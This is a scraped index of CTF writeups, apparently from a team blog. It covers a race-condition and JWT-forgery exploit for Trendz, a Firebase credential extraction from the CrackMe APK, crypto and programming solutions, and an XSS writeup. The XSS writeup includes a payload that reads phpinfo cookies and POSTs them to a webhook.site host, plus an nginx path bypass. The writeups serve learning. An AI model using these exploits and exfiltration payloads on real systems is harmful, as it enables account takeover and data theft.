than 12 posts. Keep posting to uncover the surprise!\nNote: Use the instancer and source from part one of this challenge, Trendz.\nIntroduction We are in the second part of the Trendz challenge, so we have exactly the same application, only the target flag has changed.\nSource First thing to figure out is where the flag is located, going back to the run.sh we see that the file is located inside the POST_FLAG environment variable so we presso let\u0026rsquo;s assume that the posts center something, searching the directories with grep or something else we see that the variable is called here:\n//filename: Posts.go func DisplayFlag(ctx *gin.Context) { username := ctx.MustGet(\u0026quot;username\u0026quot;).(string) noOfPosts := CheckNoOfPosts(username) if noOfPosts \u0026lt;= 12 { ctx.JSON(200, gin.H{\u0026quot;error\u0026quot;: fmt.Sprintf(\u0026quot;You need %d more posts to view the flag\u0026quot;, 12-noOfPosts)}) return } ctx.JSON(200, gin.H{\u0026quot;flag\u0026quot;: os.Getenv(\u0026quot;POST_FLAG\u0026quot;)}) } Oh we just need to make 12 simple posts no?\nWell not really in fact if we see the function that creates the posts we can see that it doesn\u0026rsquo;t allow us to make more than 12\n//filename: Posts.go func CreatePost(ctx *gin.Context) { username := ctx.MustGet(\u0026quot;username\u0026quot;).(string) noOfPosts := CheckNoOfPosts(username) var req struct { Title string `json:\u0026quot;title\u0026quot;` Data string `json:\u0026quot;data\u0026quot;` } if err := ctx.BindJSON(\u0026amp;req); err != nil { ctx.JSON(400, gin.H{\u0026quot;error\u0026quot;: \u0026quot;Invalid request\u0026quot;}) fmt.Println(err) return } if noOfPosts \u0026gt;= 10 { ctx.JSON(200, gin.H{\u0026quot;error\u0026quot;: \u0026quot;You have reached the maximum number of posts\u0026quot;}) return } if len(req.Data) \u0026gt; 210 { ctx.JSON(200, gin.H{\u0026quot;error\u0026quot;: \u0026quot;Data length should be less than 210 characters\u0026quot;}) return } postID := InsertPost(username, req.Title, req.Data) ctx.JSON(200, gin.H{\u0026quot;postid\u0026quot;: postID}) } As we can see, a function is executed that checks the number of posts, which in itself is not a major problem, the problem lies in the misuse of this function.\nThis is because although go is very fast and even postgree actually this doesn\u0026rsquo;t stop us from making a race condition\nSolution The solution itself is very simple just create a large amount of requests simultaneously with the same session and hope to enter more posts than allowed by doing so we will be able to bypass the control and get our flag\nProbably the reason it works is much more precise and technical, but to tell you the truth, it came to me as soon as I saw it and tried it, and apparently my hunch was right\u0026hellip;\nFinal script This is the final exploit script with the 2 challenge solution\n# filename: exploit.py #!/usr/bin/python3 from concurrent.futures import ThreadPoolExecutor, as_completed from bs4 import BeautifulSoup import requests import jwt import string import random BASE_URL = \u0026quot;https://ID-INSTANCE.bugg.cc/\u0026quot; s = requests.Session() def random_string(length): return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)) def login(username, password): response = s.post(f\u0026quot;{BASE_URL}/login\u0026quot;, json={\u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password}) if response.status_code != 200: print(f\u0026quot;Login failed: {response.status_code}\u0026quot;) exit(response.status_code) def register(username, password): response = s.post(f\u0026quot;{BASE_URL}/register\u0026quot;, json={\u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password}) if response.status_code != 200: print(f\u0026quot;Register failed: {response.status_code}\u0026quot;) exit(response.status_code) def logout(): s.cookies.clear() def create_post(title: str = \u0026quot;title\u0026quot;, content: str = \u0026quot;content\u0026quot;): response = s.post(f\u0026quot;{BASE_URL}/user/posts/create\u0026quot;, json={\u0026quot;title\u0026quot;: title, \u0026quot;data\u0026quot;: content}) if response.status_code != 200: print(f\u0026quot;Post creation failed: {response.status_code}\u0026quot;) exit(response.status_code) def run_tasks(num_tasks, concurrency_limit): results = [] with ThreadPoolExecutor(max_workers=concurrency_limit) as executor: futures = [executor.submit(create_post) for _ in range(num_tasks)] for future in as_completed(futures): results.append(future.result()) return results def download_secret(): r = s.get(f\u0026quot;{BASE_URL}/static../jwt.secret\u0026quot;, stream=True) with open(\u0026quot;jwt.secret\u0026quot;, \u0026quot;wb\u0026quot;) as f: for chunk in r.iter_content(chunk_size=1024): f.write(chunk) def resign_jwt(claims, secret_key): return jwt.encode(claims, secret_key, algorithm='HS256') def get_flag_2(): for _ in range(10): print(\u0026quot;Try: \u0026quot; + str(_),end=\u0026quot;\\r\u0026quot;) run_tasks(num_tasks=50,concurrency_limit=100) response = s.get(f\u0026quot;{BASE_URL}/user/flag\u0026quot;) if \u0026quot;CSCTF{\u0026quot; in response.text: print(\u0026quot;Flag 2 trendzz: \u0026quot; + response.json()['flag']) return True else: logout() username, password = random_string(10), random_string(10) register(username, password) login(username, password) return False def get_flag_1(): download_secret() with open(\u0026quot;./jwt.secret\u0026quot;, \u0026quot;rb\u0026quot;) as file: key = file.read() print(f\u0026quot;Jwt secret leaked: {key}\u0026quot;) original_token = s.cookies.get_dict().get(\u0026quot;accesstoken\u0026quot;) decoded_claims = jwt.decode(original_token, key, algorithms=['HS256']) decoded_claims['role'] = 'admin' new_jwt = resign_jwt(decoded_claims, key) s.cookies.update({\u0026quot;accesstoken\u0026quot;: new_jwt}) response = requests.get(f\u0026quot;{BASE_URL}/admin/dashboard\u0026quot;,cookies={\u0026quot;accesstoken\u0026quot;: new_jwt}) soup = BeautifulSoup(response.text, 'html.parser') postid = soup.find_all('td')[1].text print(f\u0026quot;Post-id: {postid}\u0026quot;) flag = s.get(f\u0026quot;{BASE_URL}/user/posts/{postid}\u0026quot;).json().get(\u0026quot;data\u0026quot;) print(\u0026quot;Flag 1 trendz: \u0026quot; + flag) def main(): print(\u0026quot;Exploiting...\u0026quot;) username, password = random_string(10), random_string(10) register(username, password) login(username, password) get_flag_1() if not get_flag_2(): print(\u0026quot;Flag 2 retrieval failed try again :(\u0026quot;) if __name__ == \u0026quot;__main__\u0026quot;: main() $ flag 1: CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52} $ flag 2: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94} PS: In the first flag I skipped a very funny part, in fact it is not enough to log in only as admin because we will not be shown the flag but a post of an ID that if you remember the flag was also in a precise record initialised in run.sh, if through /user/posts/post-id we view the post we can find the flag\nAuthor: akiidjk ","permalink":"http://localhost:1313/writeups/cyberspace2024/trendz/","title":"Trendz"},{"content":"Trendy windy trigonity Description: have you seen Tan challenge before? see maple version pi documentation!\nIntroduction trendy windy trigonity was a crypto CTF CyberSpace CTF 2024 added during the second wave.\nfrom Crypto.Util.number import bytes_to_long flag = REDACTED print(len(flag)) R = RealField(1000) a, b = bytes_to_long(flag[:len(flag)//2]), bytes_to_long(flag[len(flag)//2:]) x = R(0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100) enc = a*cos(x)+b*sin(x) # 38 # 2.78332652222000091147933689155414792020338527644698903976732528036823470890155538913578083110732846416012108159157421703264608723649277363079905992717518852564589901390988865009495918051490722972227485851595410047572144567706501150041757189923387228097603575500648300998275877439215112961273516978501e45 The challenge uses sagemath to handle high precision floating point numbers, in this case a RealField with 1000 bits of precision. The idea behind the challenge is very simple: find a and b to retrieve the flag.\nSolution enc is a linear combination of cos(x) and sin(x), you know what that means: lattice. Don\u0026rsquo;t forget to scale by the precision as we are working with integers.\nR = RealField(1000) x = R(0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100) enc = R(2.78332652222000091147933689155414792020338527644698903976732528036823470890155538913578083110732846416012108159157421703264608723649277363079905992717518852564589901390988865009495918051490722972227485851595410047572144567706501150041757189923387228097603575500648300998275877439215112961273516978501e45) scale = 2^1000 m = matrix(ZZ, [ [1, 0, scale*cos(x)], [0, 1, scale*sin(x)], [0, 0, -scale*enc], ]) vec = m.LLL()[0] a, b = vec[0], vec[1] print(f'flag: {(a.to_bytes(19) + b.to_bytes(19)).decode()}') $ flag: CSCTF{Trigo_453_Tr3ndy_FuN_Th35e_D4Y5} Author: vympel\n","permalink":"http://localhost:1313/writeups/cyberspace2024/trendy_windy_trigonity/","title":"trendy windy trigonity"},{"content":" CyberSpace CTF 2024 Description Get ready to dive into the cyberspace and tackle challenges across categories such as Forensics, Reverse Engineering, Cryptography, Jail, and many more, at https://2024.csc.tf!\nUrl Discord Performance Summary CTFs: 21/63 Total points: 2032 Position: 83/830 Rating points: 3.355 Writeups Crypto trendy windy trigonity Web ZipZone FeatureUnlocked Trendz (part 1 and 2) Rev Snake ","permalink":"http://localhost:1313/writeups/cyberspace2024/","title":"CyberSpace CTF 2024"},{"content":"Miku vs. Machine Description: Time limit is 2 seconds for this challenge.\nOfficial resources of challenge\nIntroduction The goal is to distribute the hours of n singers in m shows. Each show has a number of hours equal to l (unknown) and can only change singers once. We also want that each singer will have the same time on stage.\nSolution To solve this problem, I use a greedy strategy that iteratively divides the available singing time among the singers, ensuring that each singer fulfills their required hours.\nT = int(input()) for _ in range(T): n, m = map(int, input().split(' ')) l = n print(l) duration_for_singer = m singers = [duration_for_singer] * n for i in range(len(singers)): while singers[i] \u0026gt; 0: show = [] if (singers[i] - l) \u0026gt;= 0: show.append((l//2, i+1)) show.append((l - l//2, i+1)) singers[i] -= l elif singers[i] \u0026lt; l: show.append((singers[i], i+1)) show.append((l - singers[i], i+2)) singers[i+1] -= l - singers[i] singers[i] = 0 print(f\u0026quot;{show[0][0]} {show[0][1]} {show[1][0]} {show[1][1]}\u0026quot;) Step-by-Step Explanation Initialization The first input T represents the number of test cases. After some experimentation on pen and paper, I noticed that the minimum value of l is equal to the number of singers, so l is set to n. I initialize a list singers of length n, where each element is set to m to represent the remaining singing hours for each singer. Time Distribution Logic I iterate over each singer using a loop. For each singer i, the following steps are performed: While Loop: Continue allocating time to the current singer as long as they have hours remaining (singers[i] \u0026gt; 0). Time Allocation: If the current singer has l or more hours remaining, divide l hours into two chunks: The first chunk is l//2 hours, and the second chunk is l - l//2 hours. Both chunks are allocated to the same singer. Subtract l from the singer\u0026rsquo;s remaining hours. If the current singer has less than l hours remaining: Allocate all remaining hours to the current singer. Allocate the rest of l to the next singer in line (i+2). Subtract the hours from the next singer\u0026rsquo;s total. Output: After each allocation, the result is stored in a list show and printed in the format {hours1} {singer1} {hours2} {singer2}. Output The program prints the number l as the first line for each test case. For each show, the specific distribution of hours between the singers is printed. Example Execution Input n = 4 m = 7\nExecution l = 4 singers = [7, 7, 7, 7]\ni = 0\nshow = (hours:2 singer:1 , hours:2 singer:1) singers = [3, 7, 7, 7]\nshow = ( hours:3 singer:1 , hours:1 singer:2 ) singers = [0, 6, 7, 7]\ni = 1\nshow = ( hours:2 singer:2 , hours:2 singer:2 ) singers = [0, 2, 7, 7]\nshow = ( hours:2 singer:2 , hours:2 singer:3 ) singers = [0, 0, 5, 7]\ni = 2\nshow = ( hours:2 singer:3 , hours:2 singer:3 ) singers = [0, 0, 1, 7]\nshow = ( hours:1 singer:3 , hours:3 singer:4 ) singers = [0, 0, 0, 4]\ni = 3\nshow = ( hours:2 singer:4 , hours:2 singer:4 ) singers = [0, 0, 0, 0] Output 4 2 1 2 1 3 1 1 2 2 2 2 2 2 2 2 3 2 3 2 3 1 3 3 4 2 4 2 4 Conclusion I don\u0026rsquo;t consider this challenge difficult, it\u0026rsquo;s just a greedy algorithm (it takes a lot more to scare a LeetCode boy), but it wasn\u0026rsquo;t immediately clear that the output didn\u0026rsquo;t necessarily have to be the same as that shown in the challenge\u0026rsquo;s PDF , but it was enough to fit the constraints of the problem.\n$ flag: SEKAI{t1nyURL_th1s:_6d696b75766d} Author: Tatore ","permalink":"http://localhost:1313/writeups/sekaictf2024/mikuvsmachine/","title":"Miku vs. Machine"},{"content":"Crack Me Description: Developed for SekaiCTF 2022 but never got a chance to release it. Can you log in and claim the flag?\nIntroduction First rev ctf of Sekai 2024 with an apk attached, so we have a mobile challenge on our hands. The first thing to do (which I strongly advise against in a real environment) is to download and install the app to get a quick overview of what it does.\nAs you can see, the app doesn\u0026rsquo;t allow us to do much more than press the button and log in (without being able to register).\nFirst step The first thing I did was to analyse the apk using an online tool. SISIK\nAnd two interesting pieces of information came up: the first was that it was a react-native app, which helps us a lot in reverse, and that the app was using firebase to handle the backend and probably authentication as well.\nSecond Step The apk is actually a compressed set of java files like a zipper and tar, this then allows us to easily extract the contents with any tool like unzip or 7z (in my case I used extract which is a utils of zsh).\nOnce we have extracted the contents we should find something like this\nAs we can see, we have a huge number of files, but this is where tools like grep or fzf come in.\nThis allows us to search for files based on keywords as in my case: admin,sekai,user,password\nAfter some research we can find us an obfuscated js file named: index.android.bundle\nAfter some research we can find there a file named index.android.bundle with some obfuscated javascript inside, knowing that the application is written in react-native and that inside this file there are keywords like: admin,sekai,password, it is definitely an interesting file.\nThird Step One possible idea might be a react-native app decompiler, which fortunately exists and is easy to find in the case I used: React Native Decompiler\nOnce installed, and running the command react-native-decompiler index.android.bundle -o bundle_deobfuscated, we should find about 800 js files, a bit confusing but understandable with a little effort.\nFourth Step We can reuse grep and fzf to search again for the words of interest.\nBy searching, we manage to find a really interesting file, in which we find the login system that is done in the application.\nfunction _() { var e, o; module25.default(this, _); (e = L.call(this, ...args)).state = { email: \u0026quot;\u0026quot;, password: \u0026quot;\u0026quot;, wrongEmail: false, wrongPwd: false, checked: false, verifying: false, errorTitle: \u0026quot;\u0026quot;, errorMessage: \u0026quot;\u0026quot;, }; e._verifyEmail = ((o = module275.default(function* (t) { t.setState({ verifying: true, }); var n = module478.initializeApp(module477.default), o = module486.getDatabase(n); if ( \u0026quot;admin@sekai.team\u0026quot; !== t.state.email || false === e.validatePassword(t.state.password) ) console.log(\u0026quot;Not an admin account.\u0026quot;); else console.log(\u0026quot;You are an admin...This could be useful.\u0026quot;); var s = module488.getAuth(n); module488 .signInWithEmailAndPassword(s, t.state.email, t.state.password) .then(function (e) { t.setState({ verifying: false, }); var n = module486.ref(o, \u0026quot;users/\u0026quot; + e.user.uid + \u0026quot;/flag\u0026quot;); module486.onValue(n, function () { t.setState({ verifying: false, }); t.setState({ errorTitle: \u0026quot;Hello Admin\u0026quot;, errorMessage: \u0026quot;Keep digging, you are almost there!\u0026quot;, }); t.AlertPro.open(); }); }) .catch(function (e) { // Different error messages }); })), function (e) { return o.apply(this, arguments); }); e.validatePassword = function (e) { if (17 !== e.length) return false; var t = module700.default.enc.Utf8.parse(module456.default.KEY), n = module700.default.enc.Utf8.parse(module456.default.IV); return ( \u0026quot;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026quot; === module700.default.AES.encrypt(e, t, { iv: n, }).ciphertext.toString(module700.default.enc.Hex) ); }; } Now let\u0026rsquo;s analyse the operation of the login\u0026hellip; as we can see the email that checks for the login is only one, that of the admin admin@sekai.team and the password is checked with a function in particular validatePassword.\nGoing to analyse the function, we see that the decryption of a hex string is done via AES, but even more important detail, the IV and the Key are imported from another file, by analysing the form in question we can find out the value of the IV and the Key.\nvar _ = { LOGIN: \u0026quot;LOGIN\u0026quot;, EMAIL_PLACEHOLDER: \u0026quot;user@sekai.team\u0026quot;, PASSWORD_PLACEHOLDER: \u0026quot;password\u0026quot;, BEGIN: \u0026quot;CRACKME\u0026quot;, SIGNUP: \u0026quot;SIGN UP\u0026quot;, LOGOUT: \u0026quot;LOGOUT\u0026quot;, KEY: \u0026quot;react_native_expo_version_47.0.0\u0026quot;, IV: \u0026quot;__sekaictf2023__\u0026quot;, }; exports.default = _; This allows us to easily find the password even with a trivial Python script like this one:\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad key = b\u0026quot;react_native_expo_version_47.0.0\u0026quot;[:32] iv = b\u0026quot;__sekaictf2023__\u0026quot; ciphertext = binascii.unhexlify( \u0026quot;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026quot;) email = \u0026quot;admin@sekai.team\u0026quot; def decrypt_password(): cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) password = decrypted.decode('utf-8') assert len(password) == 17 return password def main(): password = decrypt_password() print(\u0026quot;password:\u0026quot;, password) print(\u0026quot;email: \u0026quot;, email) if __name__ == '__main__': main() # OUTPUT: # password: s3cr3t_SEKAI_P@ss # email: admin@sekai.team PERFECT! It\u0026rsquo;s done, we have the flag, we just need to log in to the application\nOR MAYBE NOT \u0026hellip;\nFifth step After a moment\u0026rsquo;s panic, I resume checking the code and how the login system works; indeed, we can see that as soon as the login is complete, a request is made to the database (probably the firebase realtime database)\nSo, in a sense, the flag has been given to us, we just have to catch it on the fly, and there are two ways of doing that.\nUnintended solution The first solution was to intercept the call and answer from the app to the db and vice versa, but using arch with an NVIDIA video card I had trouble with Android emulation, but you can still find a solution. similar solution\nIntended solution (The one i performed) Given my difficulties with the emulation of the application, I continued my search for code, this time also searching Firebase, and managed to find something very interesting\nvar c = { apiKey: \u0026quot;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk\u0026quot;, authDomain: \u0026quot;crackme-1b52a.firebaseapp.com\u0026quot;, projectId: \u0026quot;crackme-1b52a\u0026quot;, storageBucket: \u0026quot;crackme-1b52a.appspot.com\u0026quot;, messagingSenderId: \u0026quot;544041293350\u0026quot;, appId: \u0026quot;1:544041293350:web:2abc55a6bb408e4ff838e7\u0026quot;, measurementId: \u0026quot;G-RDD86JV32R\u0026quot;, databaseURL: \u0026quot;https://crackme-1b52a-default-rtdb.firebaseio.com\u0026quot;, }; exports.default = c; As you can see, we are faced with a firebase configuration file with sensitive information that allows us to connect directly to the firebase database using js. So in the end we just need to replicate the functions used in the login to get the flag.\nSolution \u0026hellip;\n# filename: exploit.py from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import binascii import subprocess key = b\u0026quot;react_native_expo_version_47.0.0\u0026quot;[:32] iv = b\u0026quot;__sekaictf2023__\u0026quot; ciphertext = binascii.unhexlify( \u0026quot;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026quot;) email = \u0026quot;admin@sekai.team\u0026quot; def get_flag(email, password): process = subprocess.Popen( [\u0026quot;node\u0026quot;, \u0026quot;exploit.js\u0026quot;, email, password], stdout=subprocess.PIPE, stderr=subprocess.PIPE ) stdout, stderr = process.communicate() print(stdout.decode('utf-8')) if stderr: print(stderr.decode('utf-8')) def decrypt_password(): cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) password = decrypted.decode('utf-8') assert len(password) == 17 return password def main(): password = decrypt_password() print(\u0026quot;password:\u0026quot;, password) print(\u0026quot;email: \u0026quot;, email) get_flag(email, password) if __name__ == '__main__': main() // filename: exploit.js import { initializeApp } from \u0026quot;firebase/app\u0026quot;; import { getAuth, signInWithEmailAndPassword } from \u0026quot;firebase/auth\u0026quot;; import { getDatabase, ref, get } from \u0026quot;firebase/database\u0026quot;; import { exit } from \u0026quot;process\u0026quot;; let app = initializeApp({ apiKey: \u0026quot;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk\u0026quot;, authDomain: \u0026quot;crackme-1b52a.firebaseapp.com\u0026quot;, storageBucket: \u0026quot;crackme-1b52a.appspot.com\u0026quot;, projectId: \u0026quot;crackme-1b52a\u0026quot;, messagingSenderId: \u0026quot;544041293350\u0026quot;, appId: \u0026quot;1:544041293350:web:2abc55a6bb408e4ff838e7\u0026quot;, measurementId: \u0026quot;G-RDD86JV32R\u0026quot;, databaseURL: \u0026quot;https://crackme-1b52a-default-rtdb.firebaseio.com\u0026quot;, }); var db = getDatabase(app); var auth = getAuth(app); async function loginAndGetFlag(email, password) { try { const userCredential = await signInWithEmailAndPassword( auth, email, password ); console.log(\u0026quot;Logged in\u0026quot;); var n = ref(db, \u0026quot;users/\u0026quot; + userCredential.user.uid + \u0026quot;/flag\u0026quot;); const snapshot = await get(n); if (snapshot.exists()) { console.log(\u0026quot;Flag value:\u0026quot;, snapshot.val()); } } catch (error) { console.error(\u0026quot;Error logging in or fetching flag:\u0026quot;, error); } } const args = process.argv.slice(2); const email = args[0]; const password = args[1]; $ flag: SEKAI{15_React_N@71v3_R3v3rs3_H@RD???} Author: akiidjk ","permalink":"http://localhost:1313/writeups/sekaictf2024/crackme/","title":"Crack Me"},{"content":" Some Trick Description: Bob and Alice found a futuristic version of opunssl and replaced all their needs for doofy wellmen.\nIntroduction Some Trick was the first cryptography challenge in the 2024 edition of SekaiCTF. The challenge implements a key exchange based on a set of permutations and asks us to retrieve the flag that was used as a key in Bob\u0026rsquo;s first encryption.\nimport random from secrets import randbelow, randbits from flag import FLAG CIPHER_SUITE = randbelow(2**256) print(f\u0026quot;oPUN_SASS_SASS_l version 4.0.{CIPHER_SUITE}\u0026quot;) random.seed(CIPHER_SUITE) GSIZE = 8209 GNUM = 79 LIM = GSIZE**GNUM def gen(n): p, i = [0] * n, 0 for j in random.sample(range(1, n), n - 1): p[i], i = j, j return tuple(p) def gexp(g, e): res = tuple(g) while e: if e \u0026amp; 1: res = tuple(res[i] for i in g) e \u0026gt;\u0026gt;= 1 g = tuple(g[i] for i in g) return res def enc(k, m, G): if not G: return m mod = len(G[0]) return gexp(G[0], k % mod)[m % mod] + enc(k // mod, m // mod, G[1:]) * mod def inverse(perm): res = list(perm) for i, v in enumerate(perm): res[v] = i return res G = [gen(GSIZE) for i in range(GNUM)] FLAG = int.from_bytes(FLAG, 'big') left_pad = randbits(randbelow(LIM.bit_length() - FLAG.bit_length())) FLAG = (FLAG \u0026lt;\u0026lt; left_pad.bit_length()) + left_pad FLAG = (randbits(randbelow(LIM.bit_length() - FLAG.bit_length())) \u0026lt;\u0026lt; FLAG.bit_length()) + FLAG bob_key = randbelow(LIM) bob_encr = enc(FLAG, bob_key, G) print(\u0026quot;bob says\u0026quot;, bob_encr) alice_key = randbelow(LIM) alice_encr = enc(bob_encr, alice_key, G) print(\u0026quot;alice says\u0026quot;, alice_encr) bob_decr = enc(alice_encr, bob_key, [inverse(i) for i in G]) print(\u0026quot;bob says\u0026quot;, bob_decr) Solution The first thing we do is retrieve the CIPHER_SUITE variable to set the random seed and reconstruct the set of permutations G, then we care about retrieving bob_key to ultimately recover the flag.\ns = int(r.recvline().strip().decode().split('.')[-1]) random.seed(s) G = [gen(GSIZE) for i in range(GNUM)] def decm(k, G, val): m = 0 for i in range(GNUM): x = val % GSIZE y = gexp(G[i], k % GSIZE).index(x) m += y * GSIZE ** i val = (val - x) // GSIZE k //= GSIZE return m bob_key = decm(alice_encr, G, bob_encr) Recovering the flag takes a bit more work, I\u0026rsquo;ve only managed a brute-force solution which I optimized the best I could; it\u0026rsquo;s not the best but it does the job.\ndef maketable(g): gg = deepcopy(g) # just to be safe table = {} for i in range(GSIZE): table[i] = gg gg = tuple(gg[i] for i in gg) return table def perm(table, e): res = tuple(table[0]) rbits = reversed(bits(e)) ones = filter(lambda x: x != -1, [i if v == 1 else -1 for i, v in enumerate(rbits)]) for index in ones: res = tuple(res[j] for j in table[index]) return res def findk(queue, event, table, start, end, index, want): for k in range(start, min(GSIZE, end)): if event.is_set(): return if perm(table, k)[index] == want: event.set() queue.put(k) return def deck(m, G, val): key = 0 for i in range(GNUM): x = val % GSIZE table = maketable(G[i]) queue = mp.Queue() event = mp.Event() ps = [mp.Process(target=findk, args=(queue, event, table, start, start + (GSIZE // mp.cpu_count()) + 1, m % GSIZE, x)) for start in range(0, GSIZE, GSIZE // mp.cpu_count())][:mp.cpu_count()] for p in ps: p.start() k = queue.get() if k == 0: return key key += k * GSIZE ** i val = (val - x) // GSIZE m //= GSIZE return key + m * GSIZE ** GNUM key = deck(bob_key, G, bob_encr) The recovered key isn\u0026rsquo;t the flag yet, as it went through some transformations first, but it\u0026rsquo;s clear that the flag\u0026rsquo;s bits are still there in the middle, untouched between the two paddings, so we can just do some shifting until we find it.\nfor i in range(key.bit_length()): shifted = key \u0026gt;\u0026gt; i for j in range(1, shifted.bit_length()): keepmask = (1 \u0026lt;\u0026lt; j) - 1 final = shifted \u0026amp; keepmask dec = final.to_bytes(keepmask.bit_length() // 8 + 1) if b'SEKAI{' in dec: start = dec.index(b'SEKAI') end = start + dec[start:].index(b'}') + 1 print(f'flag: {dec[start:end].decode()}') break else: continue break flag: SEKAI{7c124c1b2aebfd9e439ca1c742d26b9577924b5a1823378028c3ed59d7ad92d1} Author: vympel\n","permalink":"http://localhost:1313/writeups/sekaictf2024/sometrick/","title":"Some Trick"},{"content":" SekaiCTF 2024 Description SekaiCTF is back for its third iteration! This years competition will feature various categories designed to test participants skills and incentivize learning. Our CTF will have more difficult challenges, and are catered towards intermediate and advanced playershowever, there will still be beginner-friendly challenges to welcome players on the newer side.\nUrl Discord Performance Summary CTFs: 3/34 Total points: 369 Position: 136/1230 Rating points: 2.721 Writeups Rev CrackMe Crypto Some trick PPC (Professional Programming \u0026amp; Coding) Miku vs. Machine ","permalink":"http://localhost:1313/writeups/sekaictf2024/","title":"SekaiCTF 2024"},{"content":"Hello Description: Just to warm you up for the next Fight :\u0026ldquo;D\nIntroduction Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}\nThe with an ngix server\nMoreover, ctf in general gives us the possibility of using an admin bot where the flag is set in the cookies\nSource # filename: index.py \u0026lt;?php function Enhanced_Trim($inp) { $trimmed = array(\u0026quot;\\r\u0026quot;, \u0026quot;\\n\u0026quot;, \u0026quot;\\t\u0026quot;, \u0026quot;/\u0026quot;, \u0026quot; \u0026quot;); return str_replace($trimmed, \u0026quot;\u0026quot;, $inp); } if(isset($_GET['name'])) { $name=substr($_GET['name'],0,23); echo \u0026quot;Hello, \u0026quot;.Enhanced_Trim($_GET['name']); } ?\u0026gt; # filename: info.py \u0026lt;?php phpinfo(); ?\u0026gt; # filename: ngix.conf user www-data; worker_processes 1; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.php index.html index.htm; } location = /info.php { allow 127.0.0.1; deny all; } location ~ \\.php$ { root /usr/share/nginx/html; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; fastcgi_pass unix:/var/run/php/php8.2-fpm.sock; } } } As you can see, there are 3 main files to focus on\nThe first is the index file where we see how the page works and the filters used, in particular the fact that we cannot use /, spaces, etc. An info.php file which is definitely suspect and not normally needed but probably has a purpose in the challange And the ngix configuration file, which is very important because it is the one that prevents us from accessing info.php in a simple way. Solution This challenge is very nice in my opinion, neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way\u0026hellip;\nThe first one is designed to catch the cookie, because in the configuration of bot.js we see that the cookie is set to httpOnly, which makes the extraction much more difficult, but looking a little online we understand why it is present, that info.php in fact the function phpinfo() as well as showing several parameters of the php configuration and other information also shows the cookies present at that time\u0026hellip; SO THAT\u0026rsquo;S THE OBJECTIVE, to get your own bot to open /info.php.\nBut how can we do this?\nThe first step is to be able to inject a payload that opens info.php and sends the file somewhere.\nThe only entry point we see is ? name=', which is not sanitised in the best way, in fact by doing \u0026lt;h1\u0026gt;BTC (we make sure that the tag closes itself, otherwise the final / will be filtered out) we notice that the h1 is rendered and this is a first sign that we can do an xss, although we notice that the classic \u0026lt;script\u0026gt;alert('ByteTheCookies') doesn\u0026rsquo;t work, Probably some php configuration or some police, so the xss would be a bit more complex, but we can use the onerror parameter of tag img with some modifications, in fact, if we insert a classic \u0026lt;img src='invalid. jpg' onerror=\u0026quot;alert('ByteTheCookies')\u0026quot;, it will be sanitised by removing the spaces and will not allow the xss to run. But we can work around this very easily, in fact by looking for some workarounds on HackTricks and trying some of them, we find that the payload \u0026lt;img%0Csrc=\u0026quot;invalid.jpg\u0026quot;onerror=\u0026quot;alert('ByteTheCookies')\u0026quot; works.\nGOOD we managed to bypass the xss now we have to create the payload we need\u0026hellip;\nSpecifically, I used: fetch('{target}').then(r=\u0026gt;r.text()).then(t=\u0026gt;{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});\nThis payload makes an initial request and sends the content to a webhook in the form of a file, so it\u0026rsquo;s all very simple.\nHowever, the problem is that when this payload is sent, it will not work because the URLs contain / which will be removed and this is a significant problem.\nHowever, to get around this we can use a very simple trick, we just need to encode the payload in base64 beforehand and use an eval(atob(payload)).\nBy sending this in the URL, we can make the payload work without any problems. DONE, RIGHT?\nNo, because analysing the nginx configuration we notice an important detail\nlocation = /info.php { allow 127.0.0.1; deny all; } As we can see, /info.php is only accessible from localhost, and spoiler, our bot is not on the same server as the challenge.\nThis may seem like a big obstacle, but in reality, if we search the web for ngix workarounds, we can find something very interesting.\nAs we can see on Hacktricks, if we insert an accessible page immediately after a non-accessible page in the ngix URL, it will redirect us correctly to the non-accessible page, which is exactly what we need.\nSo the final solution becomes:\n# filename: exploit.py import base64 url = \u0026quot;http://idek-hello.chal.idek.team:1337/\u0026quot; url_webhook = 'https://webhook.site/8b10c871-1e0b-4050-8 2e3-e102a73da54e' url_admin = 'https://admin-bot.idek.team/idek-hello' def main(): # Bypass hacktrics https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm target = \u0026quot;http://idek-hello.chal.idek.team:1337/info.php/index.php\u0026quot; exploit = (\u0026quot;fetch('\u0026quot; + target + \u0026quot;').then(r=\u0026gt;r.text()).then(t=\u0026gt;{fetch('\u0026quot;+url_webhook+\u0026quot;',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Dati inviati al webhook');});\u0026quot;).encode() main_payload = base64.b64encode(exploit).decode() 